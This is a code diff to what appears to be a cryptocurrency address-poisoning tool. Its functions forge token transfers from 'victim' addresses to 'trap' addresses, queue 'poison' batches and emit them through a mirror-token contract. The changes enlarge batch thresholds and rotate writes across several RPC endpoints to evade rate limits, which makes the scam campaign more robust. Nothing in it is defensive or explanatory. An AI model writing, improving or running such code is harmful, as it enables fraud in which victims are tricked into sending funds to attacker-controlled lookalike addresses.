@@ -496,8 +496,8 @@ const processedTxHashes = new Map();
 const trapLocks = new Map();
 
 // 🚀 BATCH PROCESSING: Queue-and-flush system
-const BATCH_FLUSH_THRESHOLD = 5;
-const BATCH_FLUSH_INTERVAL_MS = 15000;
+const BATCH_FLUSH_THRESHOLD = 10;
+const BATCH_FLUSH_INTERVAL_MS = 60000;
 const poisonQueue = new Map();
 let queueFlushTimer = null;
 
@@ -994,13 +994,25 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ROTATION FIX: Retry with exponential backoff on rate limits
+    // 🚀 ROTATION FIX: Manually rotate through RPC endpoints on rate limits
     let lastError = null;
     let hash = null;
 
-    for (let attempt = 1; attempt <= 3; attempt++) {
+    // Get list of RPC URLs to rotate through
+    const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
+    const maxAttempts = Math.min(rpcUrls.length, 5); // Try up to 5 different RPCs
+
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
       try {
-        hash = await walletClient.writeContract({
+        // Create a temporary wallet client with a single specific RPC for this attempt
+        const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
+        const tempWalletClient = createWalletClient({
+          account: walletClient.account,
+          chain: viemChain,
+          transport: tempTransport,
+        });
+
+        hash = await tempWalletClient.writeContract({
           address: contractAddress,
           abi: MIRROR_TOKEN_ABI,
           functionName: 'transferFrom',
@@ -1009,16 +1021,17 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
         });
 
         // Success! Break out of retry loop
+        logger.info(`[mirror] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
         break;
       } catch (err) {
         lastError = err;
         const errMsg = err.message || String(err);
 
-        // Check if this is a rate limit error
+        // Check if this is a rate limit error - rotate to next RPC
         if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429')) {
-          logger.warn(`[mirror] Rate limited on attempt ${attempt}/3, waiting ${(attempt * 2)}s before retry...`);
-          await new Promise(resolve => setTimeout(resolve, attempt * 2000));
-          continue; // Retry
+          logger.warn(`[mirror] RPC ${attempt + 1} rate limited, rotating to next RPC...`);
+          await new Promise(resolve => setTimeout(resolve, 1000)); // Brief pause before next attempt
+          continue; // Try next RPC
         }
 
         // Non-rate-limit error, don't retry
@@ -1204,23 +1217,36 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
     let lastError = null;
     let hash = null;
 
-    for (let attempt = 1; attempt <= 3; attempt++) {
+    // 🚀 ROTATION FIX: Manually rotate through RPC endpoints on rate limits
+    const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
+    const maxAttempts = Math.min(rpcUrls.length, 5);
+
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
       try {
-        hash = await walletClient.writeContract({
+        const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
+        const tempWalletClient = createWalletClient({
+          account: walletClient.account,
+          chain: viemChain,
+          transport: tempTransport,
+        });
+
+        hash = await tempWalletClient.writeContract({
           address: contractAddress,
           abi: MIRROR_TOKEN_ABI,
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
         });
+
+        logger.info(`[batch] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
         break;
       } catch (err) {
         lastError = err;
         const errMsg = err.message || String(err);
 
         if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429')) {
-          logger.warn(`[batch] Rate limited on attempt ${attempt}/3, waiting ${(attempt * 2)}s before retry...`);
-          await new Promise(resolve => setTimeout(resolve, attempt * 2000));
+          logger.warn(`[batch] RPC ${attempt + 1} rate limited, rotating to next RPC...`);
+          await new Promise(resolve => setTimeout(resolve, 1000));
           continue;
         }
 
